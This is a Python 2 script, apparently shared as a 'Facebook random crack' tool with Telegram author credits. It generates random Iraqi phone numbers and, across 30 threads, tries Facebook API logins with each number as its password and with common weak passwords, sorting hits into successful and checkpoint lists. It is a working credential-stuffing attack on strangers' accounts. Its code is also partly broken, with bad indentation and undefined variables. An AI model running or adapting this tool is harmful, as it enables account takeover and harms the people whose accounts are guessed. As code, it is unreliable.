import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(150000):
	
	nmbr = random.randint(1111111, 9999999)
	
	sys.stdout = open('.txt', 'a')
	
	print(nmbr)
	
	sys.stdout.flush()
	
try:
	import requests
except ImportError:
	os.system('pip2 install requests')
	
try:
	import mechanize
except ImportError:
	os.system('pip2 install mechanize')
	time.sleep(0.1)
	os.system('python2 nmbr.py')
	
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def exb():
	print '[!] Darchuit'
	os.sys.exit()
	
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
def t():
	time.sleep(0.1)
def cb():
	os.system('clear')
	
logo ='''
 \033[31m
 
  ______ _____  _____   ____  _____  
 |  ____|  __ \|  __ \ / __ \|  __ \ 
 | |__  | |__) | |__) | |  | | |__) |
 |  __| |  _  /|  _  /| |  | |  _  / 
 | |____| | \ \| | \ \| |__| | | \ \ 
 |______|_|  \_\_|  \_\\____/ |_|  \_\
                                     
  \033[37mEdited by Error - 114
\033[30m===========================================
\033[37m
  Author : Error - 114\n   Telegram : @iq_professor\n    Telegram Channel :  @anas_hacker0
\033[30m===========================================
'''
	
back = 0
successful = []
cpb = []
oks = []
id = []
CorrectUsername = 'error'
CorrectPassword = 'tool'
os.system('clear')
loop = 'true'
while loop == 'true':
	username = raw_input('\x1b[1;92m Username >> ')
	if username == CorrectUsername:
		password = raw_input('\x1b[1;91m Password >> ')
		if password == CorrectPassword:
			print '\x1b[1;92m ! Bro Xoty :) ' + username
			time.sleep(0.3)
			loop = 'false'
		else:
			print 'Password Halaya'
			os.system('xdg-open https://t.me/anas_hacker0')
	else:
		print 'Username Halaya'
		os.system('xdg-open https://t.me/anas_hacker0')
		
def menu():
	os.system('clear')
	print logo
	print '\033[32m[1] Crack FB-Random '
	print '\033[31m[0] Darchun \033[37m           '
	print
	print 43*'\x1b[90;1m=\033[37m'
	action()
	
	
def action():
	bch = raw_input('\n[1] yan [2] ==>>  ')
	if bch =='':
		print '[!] Halat Krd'
		action()
	elif bch =="1":
		os.system('clear')
		print(logo)
		print('\033[1;31m Crack Krdn Ba Random\033[0m')
		print
		try:
			k = raw_input(" Code Wllat +964 >>> ")
			c = raw_input (" Zhmaray Sarata >>> ")
			binni = raw_input (" Zhmaray Mob >>> ")
			idlist = '.txt'
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Nadozrayawa")
			raw_input("\n[ Garanawa ]")
			menu()
	elif bch =="0":
		exb()
	else:
		print '[!] Halat Krd'
		action()
		
	xxx  = str(len(id))
	print 43*'\x1b[90;1m=\033[37m'
	psb (' Hamu Zhmarakan >>> '+xxx)
	time.sleep(0.3)
	psb (' Crack Dasty Pekrd ')
	time.sleep(0.3)
	psb (' Wastan Tool Ctrl + Z ')
	time.sleep(0.3)
	print 43*'\x1b[90;1m=\033[37m'
	print
	
	
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;32;40m[OK] Zhmara >> ' + k + c + user + ' | Ramza >> ' + pass1
			elif 'free.facebook.com' in q['error_msg']:
				print '\x1b[31m[CP] Zhmara >> ' + k + c + user + ' | Ramza >> ' + pass1
			else:
				pass2 = '1122334455'
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;32;40m[OK] Zhmara >> ' + k + c + user + ' | Ramza >> ' + pass2
					elif 'free.facebook.com' in q['error_msg']:
						print '\x1b[31m[CP] Zhmara >> ' + k + c + user + ' | Ramza >> ' + pass2
				else:
					pass3 = '1122334455'
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;32;40m[OK] Zhmara >> ' + k + c + user + ' | Ramza >> ' + pass3
					elif 'free.facebook.com' in q['error_msg']:
						print '\x1b[31m[CP] Zhmara >> ' + k + c + user + ' | Ramza >> ' + pass3
					else:
						pass4 = '123456123456'
						if 'www.facebook.com' in q['error_msg']:
							print '\x1b[31m[CP] Zhmara >> ' + k + c + user + ' | Ramza >> ' + pas4
						elif 'free.facebook.com' in q['error_msg']:
							print '\x1b[31m[CP] Zhmara >> ' + k + c + user + ' | Ramza >> ' + pass4
							cps.close()
							cpb.append(c+user+pass2)
							
							
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print 40*'\x1b[90;1m~'
	print ' Prosaka Kotay Hat ....'
	print ' Hamu OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print(' CP File Has Been Saved : save/checkpoint.txt')
	print 40*'\x1b[90;1m~'
	raw_input('\n[ENTER]Dagra Bo Garanawa')
	os.system('python2 .README.md')
	
if __name__ == '__main__':
	menu()